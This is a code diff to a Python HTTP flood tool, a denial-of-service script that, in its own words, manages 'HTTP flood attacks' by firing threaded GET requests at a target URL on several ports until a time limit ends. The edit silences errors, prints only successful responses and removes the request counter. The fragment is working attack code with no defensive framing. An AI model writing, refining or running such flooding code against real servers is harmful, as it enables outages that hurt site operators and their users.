@@ -50,17 +50,19 @@ def send_request(url, port=80):
             # Send GET request
             conn.request("GET", path, headers=headers)
             response = conn.getresponse()
-            print(f"[SUCCESS] Request sent to {url}:{port} - Status Code: {response.status}")
+
+            if 200 <= response.status < 300:  # Only show successful responses
+                print(f"[SUCCESS] Request to {url}:{port} - Status Code: {response.status}")
+
             conn.close()
-        except Exception as e:
-            print(f"[FAILED] Request to {url}:{port} failed - {e}")
+        except Exception:
+            pass  # Suppress errors for clean output
 
 # Function to manage HTTP flood attacks with time limit
 def start_flood(target_url, num_threads, ports, time_limit):
     global stop_threads
-    total_requests = 0
     start_time = time.time()
-    
+
     def time_tracker():
         while not stop_threads:
             elapsed = time.time() - start_time
@@ -70,15 +72,14 @@ def start_flood(target_url, num_threads, ports, time_limit):
                 stop_threads = True
                 break
             time.sleep(1)
-    
+
     tracker_thread = threading.Thread(target=time_tracker)
     tracker_thread.start()
-    
+
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         while not stop_threads:
             for port in ports:
                 executor.submit(send_request, target_url, port)
-                total_requests += 1
 
     tracker_thread.join()
     print("\nAttack completed.")
